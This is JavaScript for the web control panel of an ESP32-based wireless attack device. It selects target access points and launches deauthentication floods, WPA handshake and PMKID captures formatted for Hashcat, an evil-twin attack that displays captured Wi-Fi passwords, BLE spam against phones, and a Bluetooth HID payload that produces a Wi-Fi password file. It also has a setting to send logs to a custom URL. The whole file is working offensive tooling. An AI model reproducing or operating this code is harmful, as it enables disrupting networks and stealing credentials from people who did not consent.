
var AttackStateEnum = { READY: 0, RUNNING: 1, FINISHED: 2, TIMEOUT: 3 };
var AttackTypeEnum  = {
    ATTACK_TYPE_PASSIVE:     0,
    ATTACK_TYPE_HANDSHAKE:   1,
    ATTACK_TYPE_PMKID:       2,
    ATTACK_TYPE_DOS:         3,
    ATTACK_TYPE_BEACON_SPAM: 4,
    ATTACK_TYPE_PROBE:       5,
    ATTACK_TYPE_EVIL_TWIN:   6,
    ATTACK_TYPE_BT_SPAM:     7,
    ATTACK_TYPE_CLONE:       8,
    ATTACK_TYPE_BT_PAYLOAD:  9
};

var selectedApElements    = [];
var apSsidMap             = {};
var running_poll          = null;
var running_poll_interval = 1000;
var attack_timeout        = 0;
var time_elapsed          = 0;
var currentAttackType     = -1;
var defaultAttackMethodsHTML = "";
var btStatusTimer         = null;

var DISCONNECTS_MGMT_AP = [
    AttackTypeEnum.ATTACK_TYPE_DOS,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
AttackTypeEnum.ATTACK_TYPE_CLONE
];

var NO_TIMEOUT_TYPES = [
    AttackTypeEnum.ATTACK_TYPE_HANDSHAKE,
AttackTypeEnum.ATTACK_TYPE_PMKID,
AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
];

/* ── Boot ────────────────────────────────────────── */
window.onload = function () {
    defaultAttackMethodsHTML = document.getElementById("attack_method").outerHTML;

    var savedTheme = localStorage.getItem("hydra_theme") || "dark";
    document.documentElement.setAttribute("data-theme", savedTheme);

    attachRippleToAll();

    if (localStorage.getItem("hydra_disclaimer_v1") === "accepted") {
        document.getElementById("disclaimer-overlay").style.display = "none";
        init();
    } else {
        document.getElementById("disclaimer-check").addEventListener("change", function () {
            document.getElementById("disclaimer-btn").disabled = !this.checked;
        });
    }
};

function dismissDisclaimer() {
    localStorage.setItem("hydra_disclaimer_v1", "accepted");
    document.getElementById("disclaimer-overlay").style.display = "none";
    init();
}

function init() {
    getStatus();
    refreshAps();
    loadCurrentUrl();
}

/* ── Theme toggle ────────────────────────────────── */
function toggleTheme() {
    var html  = document.documentElement;
    var theme = html.getAttribute("data-theme") === "dark" ? "light" : "dark";
    html.setAttribute("data-theme", theme);
    localStorage.setItem("hydra_theme", theme);
}

/* ── Ripple effect ───────────────────────────────── */
function attachRipple(el) {
    el.addEventListener("click", function (e) {
        if (el.disabled) return;
        var rect  = el.getBoundingClientRect();
        var wave  = document.createElement("span");
        var size  = Math.max(rect.width, rect.height) * 2;
        wave.className = "ripple-wave";
        wave.style.cssText =
        "width:" + size + "px; height:" + size + "px;" +
        "left:" + (e.clientX - rect.left - size / 2) + "px;" +
        "top:"  + (e.clientY - rect.top  - size / 2) + "px;";
        el.appendChild(wave);
        setTimeout(function () { wave.remove(); }, 600);
    });
}

function attachRippleToAll() {
    document.querySelectorAll("button").forEach(attachRipple);
}

/* ── Tab switching ───────────────────────────────── */
function switchTab(name) {
    document.querySelectorAll(".nav-item").forEach(function (b) {
        b.classList.toggle("active", b.dataset.tab === name);
    });
    document.querySelectorAll(".tab-panel").forEach(function (p) {
        p.classList.toggle("active", p.id === "tab-" + name);
    });
}

/* ── AP Scanning ─────────────────────────────────── */
function refreshAps() {
    selectedApElements = [];
    apSsidMap = {};
    updateSelectedChips();
    updateSelectedCountBadge();

    var tbody = document.getElementById("ap-list");
    tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg">Scanning… this may take a few seconds</td></tr>';

    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 15000;

    oReq.onload = function () {
        tbody.innerHTML = "";
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">No access points found.</td></tr>';
            return;
        }
        var byteArray = new Uint8Array(buf);
        var count = Math.floor(byteArray.byteLength / 40);
        if (count === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">No access points found.</td></tr>';
            return;
        }
        for (var i = 0; i < count; i++) {
            var offset  = i * 40;
            var ssid    = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
            var bssid   = "";
            for (var j = 0; j < 6; j++) {
                bssid += uint8ToHex(byteArray[offset + 33 + j]);
                if (j < 5) bssid += ":";
            }
            var rssiRaw = byteArray[offset + 39];
            var rssi    = rssiRaw - 255;
            var ch      = byteArray[offset + 32];
            apSsidMap[i] = ssid || ("AP #" + i);

            var rssiClass = rssi >= -60 ? "sig-strong" : rssi >= -75 ? "sig-ok" : "sig-weak";
            var tr = document.createElement("tr");
            tr.id  = String(i);
            tr.setAttribute("onclick", "selectAp(this)");
            tr.innerHTML =
            '<td class="td-ssid">' + escapeHtml(apSsidMap[i]) + '</td>' +
            '<td class="td-bssid"><code>' + bssid + '</code></td>' +
            '<td class="td-ch">' + (ch || '?') + '</td>' +
            '<td class="td-rssi"><span class="' + rssiClass + '">' + rssi + ' dBm</span></td>';
            tbody.appendChild(tr);
        }
    };

    oReq.onerror   = function () { tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">Scan failed. Check connection to ESP32.</td></tr>'; };
    oReq.ontimeout = function () { tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">Scan timed out.</td></tr>'; };

    oReq.open("GET", "http://192.168.4.1/ap-list", true);
    oReq.send();
}

/* ── AP Selection ────────────────────────────────── */
function getMaxTargets() {
    var attackType   = parseInt(document.getElementById("attack_type").value);
    var attackMethod = parseInt(document.getElementById("attack_method").value);
    if (isNaN(attackType)) return 16;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE) return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_PMKID)     return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_CLONE)     return 1;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_DOS) {
        if (!isNaN(attackMethod) && attackMethod === 1) return 16;
        return 1;
    }
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_SPAM)     return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_PROBE)       return 0;
    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD)  return 0;
    return 1;
}

function selectAp(el) {
    var id  = parseInt(el.id);
    var max = getMaxTargets();
    if (max === 0) return;
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        el.classList.remove("selected");
    } else {
        if (selectedApElements.length >= max) {
            var prevId  = selectedApElements[0];
            var prevRow = document.getElementById(String(prevId));
            if (prevRow) prevRow.classList.remove("selected");
            selectedApElements = [];
        }
        selectedApElements.push(id);
        el.classList.add("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function deselectAp(id) {
    var idx = selectedApElements.indexOf(id);
    if (idx > -1) {
        selectedApElements.splice(idx, 1);
        var row = document.getElementById(String(id));
        if (row) row.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function enforceSelectionLimit() {
    var max = getMaxTargets();
    while (selectedApElements.length > max && max >= 0) {
        var removedId  = selectedApElements.pop();
        var removedRow = document.getElementById(String(removedId));
        if (removedRow) removedRow.classList.remove("selected");
    }
    updateSelectedChips();
    updateSelectedCountBadge();
}

function updateSelectedChips() {
    var container = document.getElementById("selected-ap-chips");
    if (!container) return;
    if (selectedApElements.length === 0) {
        container.innerHTML = '<span class="no-ap-hint">No target selected — pick a network in the Scan tab</span>';
        return;
    }
    container.innerHTML = "";
    selectedApElements.forEach(function (id) {
        var ssid = escapeHtml(apSsidMap[id] || ("AP #" + id));
        var chip = document.createElement("span");
        chip.className = "ap-chip";
        chip.innerHTML = ssid + '<span class="chip-x" onclick="deselectAp(' + id + ')">✕</span>';
        container.appendChild(chip);
    });
}

function updateSelectedCountBadge() {
    var n = selectedApElements.length;
    var badge = document.getElementById("selected-count-badge");
    if (badge) badge.textContent = n === 0 ? "0 selected" : n + " selected";
    var badge2 = document.getElementById("selected-count-badge-attack");
    if (badge2) badge2.textContent = n === 0 ? "0 selected" : n + " selected";
}

/* ── Attack Type Selection ───────────────────────── */
function selectAttackType(type, btn) {
    document.querySelectorAll('.type-btn').forEach(function (b) { b.classList.remove('active'); });
    btn.classList.add('active');
    document.getElementById('attack_type').value = type;
    updateConfigurableFields({ value: type });
}

function updateConfigurableFields(el) {
    document.getElementById("attack_method").outerHTML = defaultAttackMethodsHTML;
    var beaconCfg     = document.getElementById("beacon_config");
    var methodRow     = document.getElementById("method-row");
    var timeoutRow    = document.getElementById("timeout-row");
    var noTimeoutNote = document.getElementById("no-timeout-note");

    beaconCfg.style.display = "none";
    if (methodRow)     methodRow.style.display    = "block";
    if (timeoutRow)    timeoutRow.style.display   = "block";
    if (noTimeoutNote) noTimeoutNote.style.display = "none";

    var type = parseInt(el.value);

    if (NO_TIMEOUT_TYPES.indexOf(type) !== -1) {
        if (timeoutRow) timeoutRow.style.display = "none";
    }

    switch (type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            setAttackMethods(["BSSID Clone (Aggressive)", "Normal Deauth", "Silent Capture"]);
            break;
        case AttackTypeEnum.ATTACK_TYPE_PMKID:
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("attack_timeout").value = 2;
            if (noTimeoutNote) noTimeoutNote.style.display = "block";
            setAttackMethods(["BSSID Clone (Aggressive)", "Normal Deauth", "Combined Deauth", "Multi-Clone Deauth"]);
        break;

        /* ── FIX #2: methodRow was previously hidden here, making mode never selectable.
         *                     Now we SHOW methodRow for beacon spam so the user can pick a mode,
         *                     then beaconCfg shows the count field below it. ── */
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("attack_timeout").value = 5;
            /* methodRow stays visible (default block) — mode dropdown shows here */
            setAttackMethods(["Common Names", "Random Strings", "Rick Roll Mode", "Security Names"]);
            beaconCfg.style.display = "block";
            break;

        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("attack_timeout").value = 5;
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            if (methodRow) methodRow.style.display = "none";
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:

            document.getElementById("attack_timeout").value = 15;

            if (methodRow)
                methodRow.style.display = "block";

        setAttackMethods([

            // 1-8 Apple Audio
            "Apple Audio 1",
            "Apple Audio 2",
            "Apple Audio 3",
            "Apple Audio 4",
            "Apple Audio 5",
            "Apple Audio 6",
            "Apple Audio 7",
            "Apple Audio 8",

            // 9-13 Apple Setup
            "Apple Setup 1",
            "Apple Setup 2",
            "Apple Setup 3",
            "Apple Setup 4",
            "Apple Setup 5",

            // 14-19 Samsung
            "Samsung Buds 1",
            "Samsung Buds 2",
            "Samsung Buds 3",
            "Samsung Buds 4",
            "Samsung Buds 5",
            "Samsung Random",

            // 20-24 Google
            "Fast Pair 1",
            "Fast Pair 2",
            "Fast Pair 3",
            "Fast Pair 4",
            "Google Random",

            // 25
            "Mixed Random"
        ]);

        break;
        case AttackTypeEnum.ATTACK_TYPE_CLONE:
            document.getElementById("attack_timeout").value = 5;
            if (noTimeoutNote) noTimeoutNote.style.display = "block";
            setAttackMethods(["Open Multiple Clones"]);
        break;
        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:
            if (methodRow) methodRow.style.display = "none";
            break;
    }
    enforceSelectionLimit();
}

function setAttackMethods(arr) {
    var sel = document.getElementById("attack_method");
    sel.removeAttribute("disabled");
    while (sel.options.length > 0) sel.remove(0);
    arr.forEach(function (label, idx) {
        var opt   = document.createElement("option");
        opt.value = idx;
        opt.text  = label;
        sel.appendChild(opt);
    });
    sel.selectedIndex = 0;
    enforceSelectionLimit();
}

/* ── Run Attack ──────────────────────────────────── */
function runAttack() {
    hideError();
    var attackType = parseInt(document.getElementById("attack_type").value);
    if (isNaN(attackType)) {
        showDialog("Please select an attack type first.");
        return false;
    }

    var needsAp = (
        attackType !== AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_SPAM     &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_PROBE        &&
        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
    );

    if (needsAp && selectedApElements.length === 0) {
        showDialog("Please select at least one target network before launching the attack.");
        return false;
    }

    var MAX_TARGETS = 16;

    var isNoTimeout    = NO_TIMEOUT_TYPES.indexOf(attackType) !== -1;
    var timeoutEnabled = isNoTimeout ? false : document.getElementById("timeout_enable").checked;
    var timeoutMin     = parseInt(document.getElementById("attack_timeout").value) || 1;
    var timeoutSec     = timeoutEnabled ? Math.min(65535, timeoutMin * 60) : 0;

    /* Beacon spam: byte 1 = count, byte 4 = mode (repurposed from ap_count)
     * All other attacks: byte 1 = method, byte 4 = ap count */
    var attackMethod = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? (parseInt(document.getElementById("beacon_count").value) || 20)
    : (parseInt(document.getElementById("attack_method").value) || 0);

    /* FIX #1: beaconMode was used in arr[4] without ever being defined, causing a
     *          ReferenceError that silently aborts runAttack() before the XHR fires. */
    var beaconMode = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? (parseInt(document.getElementById("attack_method").value) || 0)
    : 0;

    var ids = selectedApElements.slice(0, MAX_TARGETS);

    /* Binary payload layout:
     *   Byte 0   — attack type
     *   Byte 1   — attack method  OR  beacon count  (beacon spam)
     *   Byte 2-3 — timeout seconds, little-endian
     *   Byte 4   — ap count       OR  beacon mode   (beacon spam, repurposed)
     *   Byte 5+  — AP index list  (unused for beacon spam)
     */
    var buf = new ArrayBuffer(5 + MAX_TARGETS);
    var arr = new Uint8Array(buf);

    arr[0] = attackType;
    arr[1] = attackMethod;
    arr[2] = timeoutSec & 0xFF;
    arr[3] = (timeoutSec >> 8) & 0xFF;
    arr[4] = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
    ? beaconMode    /* mode goes here; C reads attack_request->ap_count as mode */
    : ids.length;
    ids.forEach(function (id, i) { arr[5 + i] = id; });

    currentAttackType = attackType;

    switchTab("attack");
    setRunningVisible(true);
    setResultVisible(false);

    var beaconWrap = document.getElementById("beacon-timer-wrap");
    var simpleWrap = document.getElementById("simple-running-wrap");
    var noTOHint   = document.getElementById("no-timeout-hint");
    var infoEl     = document.getElementById("running-attack-info");

    if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
        beaconWrap.style.display = "block";
        simpleWrap.style.display = "none";
        if (noTOHint) noTOHint.style.display = "none";
        attack_timeout = timeoutEnabled ? (timeoutMin * 60) : Infinity;
        time_elapsed   = 0;
        stopProgressTimer();
        running_poll = setInterval(countProgress, running_poll_interval);
        updateTimerDisplay();
    } else {
        beaconWrap.style.display = "none";
        simpleWrap.style.display = "block";
        stopProgressTimer();
        var disconnects = DISCONNECTS_MGMT_AP.indexOf(attackType) !== -1;
        if (noTOHint) {
            noTOHint.style.display = (disconnects && !timeoutEnabled && !isNoTimeout) ? "block" : "none";
        }
    }

    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD) {
        startBtStatusPoll();
    }

    if (infoEl) infoEl.textContent = attackTypeName(attackType);

    var oReq = new XMLHttpRequest();
    oReq.open("POST", "http://192.168.4.1/run-attack", true);
    oReq.onload  = function () { setTimeout(getStatus, 500); };
    oReq.onerror = function () {
        if (attackType !== AttackTypeEnum.ATTACK_TYPE_DOS        &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_HANDSHAKE  &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN  &&
            attackType !== AttackTypeEnum.ATTACK_TYPE_CLONE) {
            showError("Could not reach ESP32. Check the Wi-Fi connection.");
            }
    };
    oReq.send(buf);

    return false;
}

/* ── Timer helpers ───────────────────────────────── */
function stopProgressTimer() {
    if (running_poll) { clearInterval(running_poll); running_poll = null; }
}

function countProgress() {
    if (attack_timeout !== Infinity && time_elapsed >= attack_timeout) {
        stopProgressTimer();
    }
    updateTimerDisplay();
    time_elapsed++;
}

function updateTimerDisplay() {
    var elEl = document.getElementById("timer-elapsed");
    var ofEl = document.getElementById("timer-of");
    var path = document.getElementById("timer-path");

    if (!elEl) return;
    elEl.textContent = formatTime(time_elapsed);

    if (attack_timeout === Infinity) {
        if (ofEl) ofEl.textContent = "no timeout";
        if (path) path.setAttribute('stroke-dasharray', '100, 100');
    } else {
        if (ofEl) ofEl.textContent = "/ " + formatTime(attack_timeout);
        var progress = Math.min((time_elapsed / attack_timeout) * 100, 100);
        if (path) path.setAttribute('stroke-dasharray', progress + ', 100');
    }
}

function formatTime(sec) {
    if (sec === Infinity || isNaN(sec)) return "∞";
    var m = Math.floor(sec / 60);
    var s = sec % 60;
    return (m > 0 ? m + "m " : "") + s + "s";
}

/* ── Running / Result visibility ─────────────────── */
function setRunningVisible(v) {
    document.getElementById("running-section").style.display       = v ? "block" : "none";
    document.getElementById("attack-config-section").style.display = v ? "none"  : "block";
}

function setResultVisible(v) {
    document.getElementById("result-section").style.display  = v ? "block" : "none";
    document.getElementById("running-section").style.display = v ? "none"  : "block";
}

/* ── Show Result ─────────────────────────────────── */
function showResult(status, attack_type, content_size, content) {
    stopProgressTimer();
    stopBtStatusPoll();
    document.getElementById("running-section").style.display = "none";
    document.getElementById("result-section").style.display  = "block";

    if (status === "TIMEOUT" &&
        (attack_type === AttackTypeEnum.ATTACK_TYPE_DOS ||
        attack_type === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE)) {
        status = "FINISHED";
        }

        var statusEl = document.getElementById("result-status");
    statusEl.textContent = status;
    statusEl.className   = "result-status " + (status === "FINISHED" ? "status-finished" : "status-timeout");

    document.getElementById("result-type").textContent = attackTypeName(attack_type);
    document.getElementById("result-body").innerHTML   = "";

    switch (attack_type) {
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
            renderHandshakeResult(content, content_size);
            break;
        case AttackTypeEnum.ATTACK_TYPE_PMKID:
            renderPmkidResult(content, content_size);
            break;
        case AttackTypeEnum.ATTACK_TYPE_DOS:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">Deauthentication attack completed. Targets were disconnected during the session.</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">Beacon spam completed.</p>';
        break;
        case AttackTypeEnum.ATTACK_TYPE_PROBE:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">Probe attack completed. Data captured in serial log.</p>';
            break;
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
            fetchEvilTwinResult();
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">BLE Spam finished. Nearby iOS / macOS devices should have seen popups.</p>';
            break;
        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:
            document.getElementById("result-body").innerHTML =
            '<div class="result-block"><p class="result-desc">Payload executed via HID attack.</p>' +
            '<a class="btn-primary" style="text-decoration:none;display:inline-block;margin-top:12px;"' +
            '   href="http://192.168.4.1/download-pass" download="wifi_passwords.txt">Download Passwords</a>' +
            '</div>';
            break;
        default:
            document.getElementById("result-body").innerHTML =
            '<p class="result-desc">Attack completed — type ' + attack_type + '.</p>';
    }

    switchTab("attack");
}

/* ── Handshake result ────────────────────────────── */
function renderHandshakeResult(content, size) {
    var el = document.getElementById("result-body");
    if (!content || size < 4) {
        el.innerHTML =
        '<p class="result-err">Handshake not captured.</p>' +
        '<p class="result-desc">Not enough EAPOL frames collected. Try moving closer to the AP or use the Broadcast method.</p>';
        return;
    }
    var hs = "";
    for (var i = 0; i < size; i++) {
        hs += uint8ToHex(content[i]);
        if (i % 50 === 49) hs += "\n";
    }
    el.innerHTML =
    '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;">' +
    '<a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;"' +
    '   href="http://192.168.4.1/capture.pcap" download="capture.pcap">↓ Download PCAP</a>' +
    '<a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;"' +
    '   href="http://192.168.4.1/capture.hccapx" download="capture.hccapx">↓ Download HCCAPX</a>' +
    '</div>' +
    '<div class="result-block"><div class="result-block-label">Raw HCCAPX Hex</div>' +
    '<pre><code id="hccapx-dump">' + hs + '</code></pre>' +
    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hccapx-dump\',this)">Copy</button>' +
    '</div>';
}

/* ── PMKID result ────────────────────────────────── */
function renderPmkidResult(content, size) {
    var el = document.getElementById("result-body");
    if (!content || size < 13) {
        el.innerHTML = '<p class="result-err">No PMKID captured. Try again closer to the AP.</p>';
        return;
    }
    var idx = 0;
    var mac_sta = "", mac_ap = "", ssid = "", ssid_text = "";
    for (var i = 0; i < 6; i++) mac_sta += uint8ToHex(content[idx + i]);
    idx += 6;
    for (var i = 0; i < 6; i++) mac_ap  += uint8ToHex(content[idx + i]);
    idx += 6;
    var ssid_len = content[idx]; idx++;
    for (var i = 0; i < ssid_len; i++) {
        ssid      += uint8ToHex(content[idx + i]);
        ssid_text += String.fromCharCode(content[idx + i]);
    }
    idx += ssid_len;
    var pmkid_lines = [];
    for (var i = 0; i < size - idx; i++) {
        if (i % 16 === 0) pmkid_lines.push("");
        pmkid_lines[pmkid_lines.length - 1] += uint8ToHex(content[idx + i]);
    }
    var hashcat = (pmkid_lines[0] || "") + "*" + mac_ap + "*" + mac_sta + "*" + ssid;
    el.innerHTML =
    '<div class="result-block">' +
    '<p><span class="kv-key">Station MAC</span> <code>' + mac_sta + '</code></p>' +
    '<p><span class="kv-key">AP MAC</span>      <code>' + mac_ap  + '</code></p>' +
    '<p><span class="kv-key">SSID</span>        <code>' + ssid + '</code> (' + escapeHtml(ssid_text) + ')</p>' +
    '</div>' +
    '<div class="result-block"><div class="result-block-label">PMKID</div>' +
    pmkid_lines.map(function (p, i) { return '<p>PMKID #' + i + ': <code>' + p + '</code></p>'; }).join("") +
    '</div>' +
    '<div class="result-block"><div class="result-block-label">Hashcat Format</div>' +
    '<pre><code id="hashcat-line">' + hashcat + '</code></pre>' +
    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hashcat-line\',this)">Copy</button>' +
    '</div>';
}

/* ── Evil Twin result ────────────────────────────── */
function fetchEvilTwinResult() {
    fetch('http://192.168.4.1/evil-twin-status')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        var el = document.getElementById("result-body");
        if (data.status === "SUCCESS") {
            el.innerHTML =
            '<div class="evil-twin-password-box">' +
            '<div class="et-ok-icon">✓</div>' +
            '<div class="et-label">Password Captured</div>' +
            '<div class="et-password" id="et-password">' + escapeHtml(data.password) + '</div>' +
            (data.wrong_attempts > 0
            ? '<div class="et-attempts">Wrong attempts before correct: <strong>' + data.wrong_attempts + '</strong></div>'
            : '') +
            '<button class="btn-secondary" style="margin-top:14px;" onclick="copyText(\'et-password\',this)">Copy Password</button>' +
            '</div>';
        } else if (data.status === "RUNNING") {
            el.innerHTML =
            '<div style="text-align:center;padding:20px 0;">' +
            '<div class="spinner"></div>' +
            '<p class="result-desc">Evil Twin running…</p>' +
            '<p style="color:var(--acc-warn);margin-top:8px;font-size:0.85rem;">Wrong attempts: <strong>' + data.wrong_attempts + '</strong></p>' +
            '</div>';
            setTimeout(fetchEvilTwinResult, 2000);
        } else {
            el.innerHTML =
            '<p class="result-err">Attack stopped — password not captured.</p>' +
            '<p class="result-desc">Wrong attempts: ' + data.wrong_attempts + '</p>';
        }
    })
    .catch(function () {
        document.getElementById("result-body").innerHTML =
        '<p class="result-err">Failed to fetch Evil Twin status. ESP32 may have disconnected.</p>';
    });
}

/* ── Reset attack ────────────────────────────────── */
function resetAttack() {
    stopProgressTimer();
    stopBtStatusPoll();
    document.getElementById("result-section").style.display        = "none";
    document.getElementById("running-section").style.display       = "none";
    document.getElementById("attack-config-section").style.display = "block";
    selectedApElements = [];
    updateSelectedChips();
    updateSelectedCountBadge();

    var oReq = new XMLHttpRequest();
    oReq.open("HEAD", "http://192.168.4.1/reset", true);
    oReq.send();
}

/* ── Status polling ──────────────────────────────── */
function getStatus() {
    var oReq = new XMLHttpRequest();
    oReq.responseType = "arraybuffer";
    oReq.timeout = 5000;

    oReq.onload = function () {
        var buf = oReq.response;
        if (!buf || buf.byteLength === 0) return;
        var arr = new Uint8Array(buf);

        var attack_state = arr[0];
        var attack_type  = arr[1];
        var content_size = arr[2] | (arr[3] << 8);
        var content      = arr.slice(4);

        if (attack_state === AttackStateEnum.RUNNING) {
            showRunning(attack_type);
        } else if (attack_state === AttackStateEnum.FINISHED ||
            attack_state === AttackStateEnum.TIMEOUT) {
            var statusLabel = (attack_state === AttackStateEnum.TIMEOUT) ? "TIMEOUT" : "FINISHED";
        showResult(statusLabel, attack_type, content_size, content);
            }
    };

    oReq.onerror = function () { /* ESP32 may be running an attack that cuts the management AP */ };
    oReq.open("GET", "http://192.168.4.1/status", true);
    oReq.send();
}

function showRunning(attack_type) {
    setRunningVisible(true);
    setResultVisible(false);
    var infoEl     = document.getElementById("running-attack-info");
    var beaconWrap = document.getElementById("beacon-timer-wrap");
    var simpleWrap = document.getElementById("simple-running-wrap");
    var btControls = document.getElementById("bt-payload-controls");

    if (infoEl) infoEl.textContent = attackTypeName(attack_type);

    if (attack_type === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD) {
        if (beaconWrap) beaconWrap.style.display = "none";
        if (simpleWrap) simpleWrap.style.display = "block";
        if (btControls) btControls.style.display = "block";
        startBtStatusPoll();
    } else {
        if (beaconWrap) beaconWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "block" : "none";
        if (simpleWrap) simpleWrap.style.display = (attack_type === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) ? "none"  : "block";
        if (btControls) btControls.style.display = "none";
    }

    switchTab("attack");
}

/* ── Error helpers ───────────────────────────────── */
function showError(msg) {
    var el = document.getElementById("errors");
    el.textContent = msg;
    el.style.display = "block";
}

function hideError() {
    var el = document.getElementById("errors");
    el.style.display = "none";
}

/* ── Dialog ──────────────────────────────────────── */
function showDialog(msg) {
    document.getElementById("dialog-msg").textContent = msg;
    document.getElementById("dialog-overlay").classList.remove("hidden");
}

function closeDialog() {
    document.getElementById("dialog-overlay").classList.add("hidden");
}


/* ── BT Payload helpers ──────────────────────────── */
function setBtPayload(payload) {
    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
    .then(function (response) {
        if (response.ok) showDialog("BT Payload changed to " + payload + ". Will take effect on next connection.");
        else             showError("Failed to set payload.");
    })
    .catch(function (err) { showError("Network error: " + err); });
}

function setBtPayloadAndRun(payload) {
    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
    .then(function (res) {
        if (res.ok) return fetch('/bt-payload-run', { method: 'POST' });
        throw new Error("Failed to set payload");
    })
    .then(function () { showDialog("Payload " + payload + " executed successfully."); })
    .catch(function (err) { showError("Error: " + err); });
}

function runBtPayloadAgain() {
    fetch('/bt-payload-run', { method: 'POST' })
    .then(function (res) {
        if (res.ok) showDialog("Re-running payload…");
        else        showError("Could not re-run payload.");
    })
    .catch(function (err) { showError("Network error: " + err); });
}

function startBtStatusPoll() {
    if (btStatusTimer) return;
    btStatusTimer = setInterval(updateBtStatus, 2000);
}

function stopBtStatusPoll() {
    if (btStatusTimer) { clearInterval(btStatusTimer); btStatusTimer = null; }
}

function updateBtStatus() {
    fetch('http://192.168.4.1/bt-status')
    .then(function (r) { return r.json(); })
    .then(function (data) {
        var statusEl = document.getElementById("bt-connection-info");
        var buttons  = document.querySelectorAll(".bt-payload-btn");
        if (!statusEl) return;
        if (data.connected) {
            statusEl.textContent = "Connected: " + data.name + " (" + data.mac + ")";
            statusEl.className   = "bt-info-connected";
        } else {
            statusEl.textContent = "Waiting for Bluetooth connection…";
            statusEl.className   = "";
        }
        buttons.forEach(function (btn) {
            btn.disabled      = data.busy || !data.connected;
            btn.style.opacity = (data.busy || !data.connected) ? "0.38" : "1";
        });
    })
    .catch(function () {});
}

/* ── Settings ────────────────────────────────────── */
function saveSettings() {
    var ssid = document.getElementById('ap-ssid').value.trim();
    var pass = document.getElementById('ap-pass').value;

    if (ssid.length < 1 || pass.length < 8) {
        showDialog("SSID cannot be empty and password must be at least 8 characters.");
        return;
    }
    if (!confirm("The device will restart. You will need to reconnect to the new network.")) return;

    fetch('/save_settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ssid=' + encodeURIComponent(ssid) + '&pass=' + encodeURIComponent(pass)
    })
    .then(function (response) {
        if (response.ok) showDialog("Settings saved. Reconnect to the new network after the device reboots.");
        else             showDialog("Failed to save settings. Please try again.");
    })
    .catch(function () {
        showDialog("Network error — the ESP32 may already be restarting.");
    });
}

/* ── Custom log URL ──────────────────────────────── */
function toggleCustomUrl() {
    var checkbox = document.getElementById("use-custom-url");
    var row      = document.getElementById("custom-url-row");
    row.style.display = checkbox.checked ? "block" : "none";
    if (!checkbox.checked) {
        fetch('/set-log-url', { method: 'POST', body: 'http://192.168.4.1/log' });
    } else {
        fetch('/get-log-url')
        .then(function (r) { return r.json(); })
        .then(function (data) {
            if (data.url && data.url !== 'http://192.168.4.1/log') {
                document.getElementById("custom-url").value = data.url;
            }
        })
        .catch(function () {});
    }
}

